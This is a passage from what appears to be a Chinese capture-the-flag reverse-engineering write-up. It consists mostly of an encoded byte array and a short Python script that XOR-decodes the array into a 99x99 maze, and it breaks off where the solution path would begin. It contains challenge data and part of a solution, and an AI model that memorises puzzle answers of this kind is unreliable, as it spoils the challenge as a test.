class="number">0x9E</span>, <span class="number">0xDB</span>, <span class="number">0x9A</span>, <span class="number">0x99</span>, <span class="number">0x98</span>, <span class="number">0x8F</span>,</span><br><span class="line"><span class="number">0x71</span>, <span class="number">0x33</span>, <span class="number">0x25</span>, <span class="number">0x64</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x37</span>, <span class="number">0x21</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x0F</span>, <span class="number">0xDC</span>, <span class="number">0xD8</span>, <span class="number">0x9E</span>, <span class="number">0x8A</span>, <span class="number">0xDC</span>, <span class="number">0xDE</span>, <span class="number">0x8F</span>,</span><br><span class="line"><span class="number">0xDA</span>, <span class="number">0xC9</span>, <span class="number">0xDC</span>, <span class="number">0x9B</span>, <span class="number">0xC9</span>, <span class="number">0x77</span>, <span class="number">0x20</span>, <span class="number">0x71</span>, <span class="number">0x25</span>, <span class="number">0x76</span>, <span class="number">0x66</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0x23</span>, <span class="number">0x71</span>, <span class="number">0x25</span>, <span class="number">0x71</span>, <span class="number">0xDC</span>, <span class="number">0xC8</span>, <span class="number">0x8E</span>,</span><br><span class="line"><span class="number">0xDF</span>, <span class="number">0xC9</span>, <span class="number">0x8B</span>, <span class="number">0xCE</span>, <span class="number">0xCF</span>, <span class="number">0x89</span>, <span class="number">0xD9</span>, <span class="number">0x9B</span>, <span class="number">0xCB</span>, <span class="number">0xD7</span>, <span class="number">0x65</span>, <span class="number">0x70</span>, <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x20</span>, <span class="number">0x31</span>,</span><br><span class="line"><span class="number">0x61</span>, <span class="number">0x20</span>, <span class="number">0xD9</span>, <span class="number">0x9A</span>, <span class="number">0xDE</span>, <span class="number">0xDD</span>, <span class="number">0xCE</span>, <span class="number">0x9B</span>, <span class="number">0xCB</span>, <span class="number">0xD9</span>, <span class="number">0xDC</span>, <span class="number">0xDF</span>, <span class="number">0xDF</span>, <span class="number">0xCD</span>, <span class="number">0xF1</span>, <span class="number">0x24</span>, <span class="number">0x60</span>, <span class="number">0x33</span>, <span class="number">0x72</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x74</span>, <span class="number">0x72</span>, <span class="number">0x61</span>, <span class="number">0x24</span>, <span class="number">0x31</span>, <span class="number">0x62</span>, <span class="number">0x29</span>, <span class="number">0x9E</span>, <span class="number">0xCA</span>, <span class="number">0xDC</span>, <span class="number">0xCA</span>, <span class="number">0xDE</span>, <span class="number">0xCE</span>, <span class="number">0xDD</span>, <span class="number">0x98</span>, <span class="number">0x9B</span>, <span class="number">0xCF</span>, <span class="number">0xD9</span>, <span class="number">0x9E</span>, <span class="number">0x74</span>,</span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x62</span>, <span class="number">0x32</span>, <span class="number">0x71</span>, <span class="number">0x70</span>, <span class="number">0x32</span>, <span class="number">0x64</span>, <span class="number">0x64</span>, <span class="number">0x70</span>, <span class="number">0x27</span>, <span class="number">0x63</span>, <span class="number">0x0F</span>, <span class="number">0xDB</span>, <span class="number">0x88</span>, <span class="number">0x9A</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xDD</span>, <span class="number">0x98</span>, <span class="number">0xCE</span>,</span><br><span class="line"><span class="number">0xCF</span>, <span class="number">0x98</span>, <span class="number">0xCF</span>, <span class="number">0xD8</span>, <span class="number">0x65</span>, <span class="number">0x62</span>, <span class="number">0x27</span>, <span class="number">0x64</span>, <span class="number">0x20</span>, <span class="number">0x32</span>, <span class="number">0x70</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x67</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0xDF</span>, <span class="number">0xC9</span>, <span class="number">0x9F</span>, <span class="number">0x8A</span>,</span><br><span class="line"><span class="number">0xCB</span>, <span class="number">0x89</span>, <span class="number">0xCC</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xD9</span>, <span class="number">0x9F</span>, <span class="number">0xCE</span>, <span class="number">0xC0</span>, <span class="number">0x73</span>, <span class="number">0x63</span>, <span class="number">0x30</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0x74</span>, <span class="number">0x60</span>, <span class="number">0x61</span>, <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x22</span>, <span class="number">0xD8</span>, <span class="number">0xCE</span>, <span class="number">0xDF</span>, <span class="number">0xCF</span>, <span class="number">0x8D</span>, <span class="number">0xDD</span>, <span class="number">0xCE</span>, <span class="number">0x9E</span>, <span class="number">0xCD</span>, <span class="number">0x8A</span>, <span class="number">0xCF</span>, <span class="number">0xCF</span>, <span class="number">0xB3</span>, <span class="number">0x62</span>, <span class="number">0x65</span>, <span class="number">0x60</span>, <span class="number">0x23</span>, <span class="number">0x61</span>, <span class="number">0x60</span>,</span><br><span class="line"><span class="number">0x34</span>, <span class="number">0x32</span>, <span class="number">0x77</span>, <span class="number">0x64</span>, <span class="number">0x70</span>, <span class="number">0x7C</span>, <span class="number">0x9F</span>, <span class="number">0xCA</span>, <span class="number">0x9B</span>, <span class="number">0x9D</span>, <span class="number">0xD8</span>, <span class="number">0x8E</span>, <span class="number">0xCB</span>, <span class="number">0x9C</span>, <span class="number">0x8A</span>, <span class="number">0x9A</span>, <span class="number">0x8A</span>, <span class="number">0x9C</span>, <span class="number">0x67</span>, <span class="number">0x74</span>,</span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x76</span>, <span class="number">0x64</span>, <span class="number">0x64</span>, <span class="number">0x71</span>, <span class="number">0x76</span>, <span class="number">0x23</span>, <span class="number">0x75</span>, <span class="number">0x60</span>, <span class="number">0x22</span>, <span class="number">0x4B</span>, <span class="number">0xCB</span>, <span class="number">0x8B</span>, <span class="number">0x89</span>, <span class="number">0x89</span>, <span class="number">0x8A</span>, <span class="number">0x9A</span>, <span class="number">0xCC</span>, <span class="number">0x9F</span>, <span class="number">0x9B</span>,</span><br><span class="line"><span class="number">0x9E</span>, <span class="number">0x89</span>, <span class="number">0xCE</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x31</span>, <span class="number">0x65</span>, <span class="number">0x76</span>, <span class="number">0x67</span>, <span class="number">0x30</span>, <span class="number">0x75</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x8B</span>, <span class="number">0xDB</span>, <span class="number">0xDD</span>, <span class="number">0xDC</span>, <span class="number">0xDE</span>,</span><br><span class="line"><span class="number">0x9A</span>, <span class="number">0xC9</span>, <span class="number">0xCB</span>, <span class="number">0x9B</span>, <span class="number">0x9B</span>, <span class="number">0x89</span>, <span class="number">0xDC</span>, <span class="number">0xD0</span>, <span class="number">0x71</span>, <span class="number">0x62</span>, <span class="number">0x71</span>, <span class="number">0x64</span>, <span class="number">0x24</span>, <span class="number">0x76</span>, <span class="number">0x76</span>, <span class="number">0x75</span>, <span class="number">0x75</span>, <span class="number">0x63</span>, <span class="number">0x20</span>, <span class="number">0x23</span>,</span><br><span class="line"><span class="number">0x8F</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0x8E</span>, <span class="number">0xCE</span>, <span class="number">0x99</span>, <span class="number">0xDB</span>, <span class="number">0x8E</span>, <span class="number">0x9A</span>, <span class="number">0x9D</span>, <span class="number">0xDC</span>, <span class="number">0xCA</span>, <span class="number">0xA5</span>, <span class="number">0x63</span>, <span class="number">0x21</span>, <span class="number">0x64</span>, <span class="number">0x21</span>, <span class="number">0x37</span>, <span class="number">0x66</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x21</span>, <span class="number">0x66</span>, <span class="number">0x71</span>, <span class="number">0x60</span>, <span class="number">0x6A</span>, <span class="number">0xDC</span>, <span class="number">0x88</span>, <span class="number">0xCE</span>, <span class="number">0x9E</span>, <span class="number">0xCD</span>, <span class="number">0xCF</span>, <span class="number">0xDA</span>, <span class="number">0xDA</span>, <span class="number">0xD8</span>, <span class="number">0x8D</span>, <span class="number">0x8E</span>, <span class="number">0x8B</span>, <span class="number">0x77</span>, <span class="number">0x35</span>, <span class="number">0x61</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x36</span>, <span class="number">0x71</span>, <span class="number">0x21</span>, <span class="number">0x34</span>, <span class="number">0x08</span>, <span class="number">0xCD</span>, <span class="number">0x9E</span>, <span class="number">0x9E</span>, <span class="number">0xDC</span>, <span class="number">0xDE</span>, <span class="number">0x9E</span>, <span class="number">0x9E</span>, <span class="number">0x8C</span>, <span class="number">0xD8</span>, <span class="number">0xDE</span>,</span><br><span class="line"><span class="number">0xDB</span>, <span class="number">0x8A</span>, <span class="number">0x74</span>, <span class="number">0x35</span>, <span class="number">0x35</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x61</span>, <span class="number">0x22</span>, <span class="number">0x31</span>, <span class="number">0x64</span>, <span class="number">0x31</span>, <span class="number">0x62</span>, <span class="number">0xC9</span>, <span class="number">0x8B</span>, <span class="number">0x9B</span>, <span class="number">0xD9</span>, <span class="number">0x9A</span>, <span class="number">0xDF</span>,</span><br><span class="line"><span class="number">0xCF</span>, <span class="number">0xC9</span>, <span class="number">0x9D</span>, <span class="number">0x9F</span>, <span class="number">0xCB</span>, <span class="number">0xCC</span>, <span class="number">0x81</span>, <span class="number">0x74</span>, <span class="number">0x30</span>, <span class="number">0x73</span>, <span class="number">0x62</span>, <span class="number">0x21</span>, <span class="number">0x70</span>, <span class="number">0x22</span>, <span class="number">0x64</span>, <span class="number">0x31</span>, <span class="number">0x60</span>, <span class="number">0x66</span>, <span class="number">0x24</span>, <span class="number">0xDF</span>,</span><br><span class="line"><span class="number">0xCE</span>, <span class="number">0xDC</span>, <span class="number">0xDE</span>, <span class="number">0xDF</span>, <span class="number">0xCF</span>, <span class="number">0xDC</span>, <span class="number">0x9C</span>, <span class="number">0x8A</span>, <span class="number">0x9A</span>, <span class="number">0x99</span>, <span class="number">0xDB</span>, <span class="number">0xE5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0x23</span>, <span class="number">0x60</span>, <span class="number">0x35</span>, <span class="number">0x77</span>, <span class="number">0x31</span>, <span class="number">0x20</span>,</span><br><span class="line"><span class="number">0x30</span>, <span class="number">0x37</span>, <span class="number">0x33</span>, <span class="number">0x7F</span>, <span class="number">0x9F</span>, <span class="number">0xDD</span>, <span class="number">0xDF</span>, <span class="number">0xCE</span>, <span class="number">0x8F</span>, <span class="number">0xDC</span>, <span class="number">0xCC</span>, <span class="number">0xDA</span>, <span class="number">0xCA</span>, <span class="number">0xCD</span>, <span class="number">0xDE</span>, <span class="number">0x9A</span>, <span class="number">0x65</span>, <span class="number">0x26</span>, <span class="number">0x37</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0x62</span>, <span class="number">0x24</span>, <span class="number">0x21</span>, <span class="number">0x60</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x1A</span>, <span class="number">0xC9</span>, <span class="number">0x9F</span>, <span class="number">0x8A</span>, <span class="number">0xCF</span>, <span class="number">0xD8</span>, <span class="number">0x89</span>, <span class="number">0xCA</span>, <span class="number">0x8A</span>, <span class="number">0x89</span>, <span class="number">0x9E</span>, <span class="number">0xDA</span>,</span><br><span class="line"><span class="number">0xD8</span>, <span class="number">0x32</span>, <span class="number">0x66</span>, <span class="number">0x24</span>, <span class="number">0x20</span>, <span class="number">0x36</span>, <span class="number">0x74</span>, <span class="number">0x60</span>, <span class="number">0x74</span>, <span class="number">0x26</span>, <span class="number">0x67</span>, <span class="number">0x60</span>, <span class="number">0x61</span>, <span class="number">0xCC</span>, <span class="number">0x9F</span>, <span class="number">0xDA</span>, <span class="number">0x9F</span>, <span class="number">0xDD</span>, <span class="number">0x99</span>, <span class="number">0xCE</span>,</span><br><span class="line"><span class="number">0xDB</span>, <span class="number">0x89</span>, <span class="number">0x9F</span>, <span class="number">0x8B</span>, <span class="number">0x8B</span>, <span class="number">0xD3</span>, <span class="number">0x37</span>, <span class="number">0x21</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x70</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x25</span>, <span class="number">0x60</span>, <span class="number">0xCA</span>, <span class="number">0x9B</span>,</span><br><span class="line"><span class="number">0xDB</span>, <span class="number">0x88</span>, <span class="number">0x8C</span>, <span class="number">0x8F</span>, <span class="number">0x9F</span>, <span class="number">0xD8</span>, <span class="number">0xDA</span>, <span class="number">0x8E</span>, <span class="number">0x9F</span>, <span class="number">0x89</span>, <span class="number">0xB3</span>, <span class="number">0x60</span>, <span class="number">0x71</span>, <span class="number">0x62</span>, <span class="number">0x31</span>, <span class="number">0x71</span>, <span class="number">0x34</span>, <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x70</span>,</span><br><span class="line"><span class="number">0x21</span>, <span class="number">0x27</span>, <span class="number">0x2A</span>, <span class="number">0x8A</span>, <span class="number">0x8A</span>, <span class="number">0x89</span>, <span class="number">0x8C</span>, <span class="number">0xDA</span>, <span class="number">0xCA</span>, <span class="number">0xD8</span>, <span class="number">0x9A</span>, <span class="number">0xCB</span>, <span class="number">0xCE</span>, <span class="number">0xCC</span>, <span class="number">0x89</span>, <span class="number">0x70</span>, <span class="number">0x64</span>, <span class="number">0x77</span>, <span class="number">0x25</span>, <span class="number">0x71</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x33</span>, <span class="number">0x66</span>, <span class="number">0x74</span>, <span class="number">0x74</span>, <span class="number">0x33</span>, <span class="number">0x31</span>, <span class="number">0x5F</span>, <span class="number">0xCB</span>, <span class="number">0x89</span>, <span class="number">0x9C</span>, <span class="number">0xDF</span>, <span class="number">0xDB</span>, <span class="number">0x8C</span>, <span class="number">0x8B</span>, <span class="number">0x8F</span>, <span class="number">0x8F</span>, <span class="number">0x8D</span>, <span class="number">0xCC</span>, <span class="number">0xD9</span>,</span><br><span class="line"><span class="number">0x30</span>, <span class="number">0x72</span>, <span class="number">0x64</span>, <span class="number">0x61</span>, <span class="number">0x25</span>, <span class="number">0x62</span>, <span class="number">0x26</span>, <span class="number">0x75</span>, <span class="number">0x25</span>, <span class="number">0x77</span>, <span class="number">0x65</span>, <span class="number">0x24</span>, <span class="number">0xCE</span>, <span class="number">0xDD</span>, <span class="number">0x98</span>, <span class="number">0x8E</span>, <span class="number">0xDE</span>, <span class="number">0xC8</span>, <span class="number">0x8F</span>, <span class="number">0x8A</span>,</span><br><span class="line"><span class="number">0x9B</span>, <span class="number">0xD9</span>, <span class="number">0x89</span>, <span class="number">0x9B</span>, <span class="number">0xD5</span>, <span class="number">0x22</span>, <span class="number">0x64</span>, <span class="number">0x70</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x60</span>, <span class="number">0x62</span>, <span class="number">0x25</span>, <span class="number">0x75</span>, <span class="number">0x72</span>, <span class="number">0xC8</span>, <span class="number">0xC8</span>, <span class="number">0x8A</span>,</span><br><span class="line"><span class="number">0xCB</span>, <span class="number">0x9D</span>, <span class="number">0xDA</span>, <span class="number">0xCE</span>, <span class="number">0xCE</span>, <span class="number">0x98</span>, <span class="number">0xC8</span>, <span class="number">0x9F</span>, <span class="number">0x9A</span>, <span class="number">0xB3</span>, <span class="number">0x31</span>, <span class="number">0x24</span>, <span class="number">0x70</span>, <span class="number">0x27</span>, <span class="number">0x32</span>, <span class="number">0x25</span>, <span class="number">0x75</span>, <span class="number">0x26</span>, <span class="number">0x31</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x30</span>, <span class="number">0x3D</span>, <span class="number">0xDD</span>, <span class="number">0x9A</span>, <span class="number">0x9A</span>, <span class="number">0x8D</span>, <span class="number">0xDE</span>, <span class="number">0x8E</span>, <span class="number">0xCA</span>, <span class="number">0xC8</span>, <span class="number">0x8C</span>, <span class="number">0x9F</span>, <span class="number">0xDE</span>, <span class="number">0xDD</span>, <span class="number">0x70</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x22</span>, <span class="number">0x63</span>, <span class="number">0x70</span>,</span><br><span class="line"><span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0x25</span>, <span class="number">0x30</span>, <span class="number">0x33</span>, <span class="number">0x1D</span>, <span class="number">0xCB</span>, <span class="number">0xDB</span>, <span class="number">0xD8</span>, <span class="number">0xCE</span>, <span class="number">0x8F</span>, <span class="number">0xCF</span>, <span class="number">0x89</span>, <span class="number">0xDC</span>, <span class="number">0xCA</span>, <span class="number">0x9F</span>, <span class="number">0xDC</span>, <span class="number">0x88</span>, <span class="number">0x24</span>,</span><br><span class="line"><span class="number">0x64</span>, <span class="number">0x77</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0x22</span>, <span class="number">0x21</span>, <span class="number">0x64</span>, <span class="number">0x24</span>, <span class="number">0x33</span>, <span class="number">0x27</span>, <span class="number">0xCE</span>, <span class="number">0x8E</span>, <span class="number">0x99</span>, <span class="number">0xDA</span>, <span class="number">0xCE</span>, <span class="number">0xCA</span>, <span class="number">0xCD</span>, <span class="number">0x8D</span>, <span class="number">0xDE</span>,</span><br><span class="line"><span class="number">0x8E</span>, <span class="number">0x9C</span>, <span class="number">0x8F</span>, <span class="number">0x80</span>, <span class="number">0x35</span>, <span class="number">0x27</span>, <span class="number">0x76</span>, <span class="number">0x75</span>, <span class="number">0x20</span>, <span class="number">0x73</span>, <span class="number">0x71</span>, <span class="number">0x31</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x63</span>, <span class="number">0x72</span>, <span class="number">0xDB</span>, <span class="number">0x88</span>, <span class="number">0x8B</span>, <span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0xCF</span>, <span class="number">0xD8</span>, <span class="number">0xD9</span>, <span class="number">0xDB</span>, <span class="number">0xCE</span>, <span class="number">0xCD</span>, <span class="number">0x8B</span>, <span class="number">0xDB</span>, <span class="number">0xA4</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x26</span>, <span class="number">0x20</span>,</span><br><span class="line"><span class="number">0x3F</span>, <span class="number">0xD9</span>, <span class="number">0xCA</span>, <span class="number">0x9B</span>, <span class="number">0xCB</span>, <span class="number">0x9C</span>, <span class="number">0xC9</span>, <span class="number">0xDB</span>, <span class="number">0x8E</span>, <span class="number">0xC8</span>, <span class="number">0x9F</span>, <span class="number">0x9B</span>, <span class="number">0x9F</span>, <span class="number">0x73</span>, <span class="number">0x66</span>, <span class="number">0x20</span>, <span class="number">0x70</span>, <span class="number">0x67</span>, <span class="number">0x30</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0x32</span>, <span class="number">0x66</span>, <span class="number">0x30</span>, <span class="number">0x61</span>, <span class="number">0x1C</span>, <span class="number">0x8F</span>, <span class="number">0x9E</span>, <span class="number">0x9A</span>, <span class="number">0xD9</span>, <span class="number">0xCD</span>, <span class="number">0xDF</span>, <span class="number">0x8E</span>, <span class="number">0x8D</span>, <span class="number">0x9B</span>, <span class="number">0xCF</span>, <span class="number">0xCB</span>, <span class="number">0xCB</span>, <span class="number">0x36</span>, <span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x25</span>, <span class="number">0x66</span>, <span class="number">0x61</span>, <span class="number">0x34</span>, <span class="number">0x61</span>, <span class="number">0x32</span>, <span class="number">0x76</span>, <span class="number">0x24</span>, <span class="number">0x30</span>, <span class="number">0x63</span>, <span class="number">0x8A</span>, <span class="number">0xDF</span>, <span class="number">0x8F</span>, <span class="number">0x98</span>, <span class="number">0x89</span>, <span class="number">0xDB</span>, <span class="number">0xDE</span>, <span class="number">0xCC</span>, <span class="number">0x8A</span>, <span class="number">0xCA</span>,</span><br><span class="line"><span class="number">0x8F</span>, <span class="number">0xD8</span>, <span class="number">0xC2</span>, <span class="number">0x60</span>, <span class="number">0x30</span>, <span class="number">0x26</span>, <span class="number">0x31</span>, <span class="number">0x75</span>, <span class="number">0x65</span>, <span class="number">0x26</span>, <span class="number">0x62</span>, <span class="number">0x74</span>, <span class="number">0x60</span>, <span class="number">0x62</span>, <span class="number">0x32</span>, <span class="number">0xCB</span>, <span class="number">0x9E</span>, <span class="number">0xDD</span>, <span class="number">0x8C</span>, <span class="number">0xDF</span>,</span><br><span class="line"><span class="number">0x9F</span>, <span class="number">0xC8</span>, <span class="number">0xCE</span>, <span class="number">0xCF</span>, <span class="number">0x8A</span>, <span class="number">0xD8</span>, <span class="number">0xCD</span>, <span class="number">0xA4</span>, <span class="number">0x75</span>, <span class="number">0x22</span>, <span class="number">0x64</span>, <span class="number">0x24</span>, <span class="number">0x35</span>, <span class="number">0x22</span>, <span class="number">0x63</span>, <span class="number">0x25</span>, <span class="number">0x34</span>, <span class="number">0x76</span>, <span class="number">0x24</span>, <span class="number">0x2E</span>,</span><br><span class="line"><span class="number">0x8A</span>, <span class="number">0x89</span>, <span class="number">0x88</span>, <span class="number">0xCB</span>, <span class="number">0xCF</span>, <span class="number">0xDD</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>, <span class="number">0xDE</span>, <span class="number">0x9C</span>, <span class="number">0x88</span>, <span class="number">0xCF</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0x75</span>, <span class="number">0x61</span>, <span class="number">0x65</span>, <span class="number">0x76</span>, <span class="number">0x62</span>, <span class="number">0x71</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x22</span>, <span class="number">0x74</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x98</span>, <span class="number">0x9D</span>, <span class="number">0x9A</span>, <span class="number">0x9F</span>, <span class="number">0x9D</span>, <span class="number">0x8E</span>, <span class="number">0xCB</span>, <span class="number">0xDB</span>, <span class="number">0x99</span>, <span class="number">0x98</span>, <span class="number">0x9A</span>, <span class="number">0x99</span>, <span class="number">0x76</span>, <span class="number">0x24</span>, <span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x24</span>, <span class="number">0x26</span>, <span class="number">0x62</span>, <span class="number">0x70</span>, <span class="number">0x20</span>, <span class="number">0x27</span>, <span class="number">0x30</span>, <span class="number">0x65</span>, <span class="number">0x65</span>, <span class="number">0xDD</span>, <span class="number">0x88</span>, <span class="number">0x9B</span>, <span class="number">0xCE</span>, <span class="number">0x9C</span>, <span class="number">0x8E</span>, <span class="number">0xCF</span>, <span class="number">0xDB</span>, <span class="number">0x8C</span>, <span class="number">0xCC</span>, <span class="number">0xDE</span>,</span><br><span class="line"><span class="number">0x9A</span>, <span class="number">0xD7</span>, <span class="number">0x74</span>, <span class="number">0x25</span>, <span class="number">0x60</span>, <span class="number">0x37</span>, <span class="number">0x22</span>, <span class="number">0x34</span>, <span class="number">0x20</span>, <span class="number">0x67</span>, <span class="number">0x61</span>, <span class="number">0x65</span>, <span class="number">0x31</span>, <span class="number">0x70</span>, <span class="number">0xD9</span>, <span class="number">0xDA</span>, <span class="number">0x9E</span>, <span class="number">0x8D</span>, <span class="number">0xCE</span>, <span class="number">0xCF</span>,</span><br><span class="line"><span class="number">0x8B</span>, <span class="number">0x9C</span>, <span class="number">0x98</span>, <span class="number">0xCF</span>, <span class="number">0x9A</span>, <span class="number">0xC8</span>, <span class="number">0xF0</span>, <span class="number">0x71</span>, <span class="number">0x24</span>, <span class="number">0x76</span>, <span class="number">0x63</span>, <span class="number">0x60</span>, <span class="number">0x30</span>, <span class="number">0x67</span>, <span class="number">0x74</span>, <span class="number">0x21</span>, <span class="number">0x34</span>, <span class="number">0x32</span>, <span class="number">0x68</span>, <span class="number">0xDF</span>,</span><br><span class="line"><span class="number">0x8E</span>, <span class="number">0x98</span>, <span class="number">0xCF</span>, <span class="number">0x8B</span>, <span class="number">0x9E</span>, <span class="number">0xDC</span>, <span class="number">0xD9</span>, <span class="number">0x8A</span>, <span class="number">0x8F</span>, <span class="number">0x8C</span>, <span class="number">0x9A</span>, <span class="number">0x61</span>, <span class="number">0x34</span>, <span class="number">0x37</span>, <span class="number">0x23</span>, <span class="number">0x35</span>, <span class="number">0x61</span>, <span class="number">0x27</span>, <span class="number">0x60</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x65</span>, <span class="number">0x23</span>, <span class="number">0x36</span>, <span class="number">0x1E</span>, <span class="number">0xDF</span>, <span class="number">0x98</span>, <span class="number">0xDB</span>, <span class="number">0x9F</span>, <span class="number">0xCA</span>, <span class="number">0xC8</span>, <span class="number">0x98</span>, <span class="number">0xDF</span>, <span class="number">0x9A</span>, <span class="number">0x88</span>, <span class="number">0xCA</span>, <span class="number">0xD9</span>, <span class="number">0x35</span>, <span class="number">0x66</span>, <span class="number">0x66</span>, <span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x30</span>, <span class="number">0x73</span>, <span class="number">0x34</span>, <span class="number">0x74</span>, <span class="number">0x34</span>, <span class="number">0x22</span>, <span class="number">0x72</span>, <span class="number">0x61</span>, <span class="number">0xDB</span>, <span class="number">0x89</span>, <span class="number">0x9F</span>, <span class="number">0xCA</span>, <span class="number">0x9E</span>, <span class="number">0xD9</span>, <span class="number">0xC9</span>, <span class="number">0x8B</span>, <span class="number">0xCE</span>, <span class="number">0x89</span>, <span class="number">0x9A</span>, <span class="number">0xCB</span>,</span><br><span class="line"><span class="number">0xC4</span>, <span class="number">0x67</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x70</span>, <span class="number">0x23</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x99</span>, <span class="number">0xCA</span>, <span class="number">0xCA</span>, <span class="number">0x8B</span>, <span class="number">0x98</span>, <span class="number">0x8D</span>, <span class="number">0x9B</span>,</span><br><span class="line"><span class="number">0x9B</span>, <span class="number">0x99</span>, <span class="number">0xCA</span>, <span class="number">0xCA</span>, <span class="number">0x8B</span>, <span class="number">0xE7</span>]</span><br></pre></td></tr></table></figure>
<p>然后遍历0-99的行和列：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tgrddf55 = [<span class="number">0x74</span>, <span class="number">0x67</span>, <span class="number">0x72</span>, <span class="number">0x64</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x35</span>, <span class="number">0x35</span>]</span><br><span class="line">width = <span class="number">99</span></span><br><span class="line">height = <span class="number">99</span></span><br><span class="line"><span class="keyword">for</span> a2 <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">  <span class="keyword">for</span> a3 <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">    magical_int = (<span class="number">99</span> * a2 + a3) // <span class="number">8</span></span><br><span class="line">    maze_data_origin = (encmap[magical_int]) ^ tgrddf55[magical_int % <span class="number">8</span>]</span><br><span class="line">    maze_data = (maze_data_origin &gt;&gt; (<span class="number">7</span> - (<span class="number">99</span> * a2 + a3) % <span class="number">8</span>)) &amp; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(maze_data == <span class="number">0</span>):</span><br><span class="line">      <span class="keyword">if</span>(a3 == width - <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>)</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">if</span>(a3 == width - <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;█&quot;</span>,a2)</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;█&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到迷宫地图如下图所示：<br><img src="/pictures/ns24_maze.png" title="maze"><br>则路径为：<br></p>
